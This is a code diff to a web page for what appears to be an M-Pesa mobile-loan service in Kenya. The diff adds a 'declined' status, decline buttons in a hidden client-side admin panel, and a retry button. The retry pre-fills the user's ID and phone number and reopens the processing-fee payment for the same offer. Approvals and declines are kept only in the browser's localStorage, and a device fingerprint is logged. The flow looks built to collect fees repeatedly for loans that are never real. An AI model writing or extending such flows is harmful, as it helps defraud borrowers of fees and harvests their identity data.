@@ -446,10 +446,34 @@
             color: #065f46;
         }
         
+        .status-declined {
+            background: #fee2e2;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+        }
+        
         .status-qualified {
             background: #cffafe;
             border: 1px solid #b6e9f5;
             color: #0e4b62;
+        }
+        
+        .retry-btn {
+            background: #f59e0b;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1.1em;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s;
+        }
+        
+        .retry-btn:hover {
+            background: #d97706;
+            transform: translateY(-2px);
         }
         
         .lenders-bar {
@@ -580,7 +604,6 @@
             padding: 30px;
         }
         
-        /* Updated styles for loan summary with correct math */
         .loan-summary {
             background: linear-gradient(135deg, #f0f9ff 0%, #e6f2f9 100%);
             border-radius: 12px;
@@ -913,6 +936,10 @@
             border-left: 4px solid #10b981;
         }
         
+        .application-item.declined {
+            border-left: 4px solid #dc2626;
+        }
+        
         .application-item.qualified {
             border-left: 4px solid #0B4F6C;
         }
@@ -945,6 +972,7 @@
             border-radius: 5px;
             cursor: pointer;
             font-size: 0.9em;
+            font-weight: 500;
         }
         
         .admin-btn.approve {
@@ -954,6 +982,15 @@
         
         .admin-btn.approve:hover {
             background: #059669;
+        }
+        
+        .admin-btn.decline {
+            background: #ef4444;
+            color: white;
+        }
+        
+        .admin-btn.decline:hover {
+            background: #dc2626;
         }
         
         /* Qualified status card */
@@ -996,6 +1033,7 @@
                 <p id="bindingErrorMessage"></p>
             </div>
             
+            <!-- Updated Safaricom notice - simplified -->
             <div class="verification-notice">
                 <strong>📱 Safaricom Only</strong>
                 <p>Only Safaricom numbers are accepted for M-Pesa payments.</p>
@@ -1019,6 +1057,7 @@
         <div class="status-message" id="statusMessage">
             <h3 id="statusTitle"></h3>
             <p id="statusText"></p>
+            <button class="retry-btn" id="retryBtn" onclick="retryApplication()" style="display: none;">RETRY APPLICATION</button>
         </div>
         
         <!-- Qualified Status Card (for returning users who scanned but haven't applied) -->
@@ -1284,7 +1323,7 @@
         </div>
     </div>
     
-    <!-- Admin Panel - Hidden -->
+    <!-- Admin Panel - Hidden with Approve and Decline buttons -->
     <div class="admin-panel" id="adminPanel">
         <h3>Applications Dashboard</h3>
         <div class="admin-filters">
@@ -1349,6 +1388,7 @@
         let isScanning = false;
         let scanInterval;
         let isBindingValid = true;
+        let declinedApplicationId = null;
         
         // Fixed loan options
         const loanOptions = [
@@ -1688,6 +1728,7 @@
             const tncAcceptSection = document.getElementById('tncAcceptSection');
             const applyBtn = document.getElementById('applyBtn');
             const resultCard = document.getElementById('resultCard');
+            const retryBtn = document.getElementById('retryBtn');
             
             // Hide all status displays first
             statusMessage.style.display = 'none';
@@ -1697,6 +1738,7 @@
             tncAcceptSection.style.display = 'none';
             applyBtn.style.display = 'none';
             resultCard.classList.remove('visible');
+            retryBtn.style.display = 'none';
             
             if (latestApp) {
                 // User has an existing application - SHOW STATUS IMMEDIATELY
@@ -1718,6 +1760,18 @@
                         <strong>Disbursement:</strong> Waiting to be sent to ${latestApp.phoneNumber}<br>
                         <strong>Reference:</strong> ${latestApp.mpesaRef}<br>
                         <strong>Approved:</strong> ${new Date(latestApp.lastUpdated || latestApp.timestamp).toLocaleString()}`;
+                } else if (latestApp.status === 'declined') {
+                    statusMessage.className = 'status-message status-declined';
+                    document.getElementById('statusTitle').innerHTML = '❌ Application Declined';
+                    document.getElementById('statusText').innerHTML = 
+                        `Your application for KSh ${latestApp.amount.toLocaleString()} was declined.<br>
+                        <strong>Reference:</strong> ${latestApp.mpesaRef}<br>
+                        <strong>Declined:</strong> ${new Date(latestApp.lastUpdated || latestApp.timestamp).toLocaleString()}<br>
+                        You can try again with the same loan offer.`;
+                    
+                    // Store declined application ID for retry
+                    declinedApplicationId = latestApp.id;
+                    retryBtn.style.display = 'inline-block';
                 }
                 return;
             }
@@ -1741,6 +1795,31 @@
             tncSection.style.display = 'block';
             tncAcceptSection.style.display = 'block';
             applyBtn.style.display = 'block';
+        }
+
+        // ================ Retry Function for Declined Applications ================
+        
+        function retryApplication() {
+            if (!declinedApplicationId) return;
+            
+            // Find the declined application
+            const declinedApp = applications.find(app => app.id === declinedApplicationId);
+            
+            if (declinedApp) {
+                // Restore the loan offer
+                qualifiedAmount = declinedApp.amount;
+                processingFee = declinedApp.fee;
+                
+                // Pre-fill the form with the user's details
+                document.getElementById('idNumber').value = declinedApp.idNumber;
+                document.getElementById('phoneNumber').value = declinedApp.phoneNumber;
+                
+                // Hide status message and show payment modal
+                document.getElementById('statusMessage').style.display = 'none';
+                
+                // Open payment modal with original offer
+                openPaymentModal();
+            }
         }
 
         // ================ Scanning Functions ================
@@ -2022,7 +2101,7 @@
             sessionStorage.removeItem('hasScanned');
         }
         
-        // ================ Admin Functions ================
+        // ================ Admin Functions with Approve and Decline ================
         
         function loadApplications() {
             const appsList = document.getElementById('applicationsList');
@@ -2054,6 +2133,19 @@
                 
                 const appElement = document.createElement('div');
                 appElement.className = `application-item ${app.status}`;
+                
+                let actionButtons = '';
+                if (app.status === 'pending') {
+                    actionButtons = `
+                        <button class="admin-btn approve" onclick="approveApplication('${app.id}')">✅ Approve</button>
+                        <button class="admin-btn decline" onclick="declineApplication('${app.id}')">❌ Decline</button>
+                    `;
+                } else if (app.status === 'approved') {
+                    actionButtons = '<span style="color: #10b981;">✓ Approved - Waiting Disbursement</span>';
+                } else if (app.status === 'declined') {
+                    actionButtons = '<span style="color: #dc2626;">✗ Declined</span>';
+                }
+                
                 appElement.innerHTML = `
                     <div class="application-details">
                         <span><strong>ID:</strong> ${app.idNumber}</span>
@@ -2066,11 +2158,7 @@
                         <span><strong>Time:</strong> ${new Date(app.timestamp).toLocaleString()}</span>
                     </div>
                     <div class="admin-actions">
-                        ${app.status === 'pending' ? 
-                            `<button class="admin-btn approve" onclick="approveApplication('${app.id}')">✅ Approve & Disburse</button>` : 
-                            app.status === 'approved' ? 
-                                '<span style="color: #10b981;">✓ Approved - Waiting Disbursement</span>' : ''
-                        }
+                        ${actionButtons}
                     </div>
                 `;
                 appsList.appendChild(appElement);
@@ -2085,6 +2173,18 @@
                 localStorage.setItem('scb_applications', JSON.stringify(applications));
                 
                 alert(`Application ${applicationId} approved. Funds will be disbursed.`);
+                loadApplications();
+            }
+        }
+        
+        function declineApplication(applicationId) {
+            const appIndex = applications.findIndex(a => a.id === applicationId);
+            if (appIndex !== -1) {
+                applications[appIndex].status = 'declined';
+                applications[appIndex].lastUpdated = new Date().toISOString();
+                localStorage.setItem('scb_applications', JSON.stringify(applications));
+                
+                alert(`Application ${applicationId} declined. User can retry.`);
                 loadApplications();
             }
         }
@@ -2169,7 +2269,6 @@
             sessionStorage.removeItem('hasScanned');
             
             console.log('Device Fingerprint:', deviceFingerprint);
-            console.log('Safaricom validation loaded with prefixes: 070,071,072,074,075,076,079,011,010');
         });
     </script>
 </body>
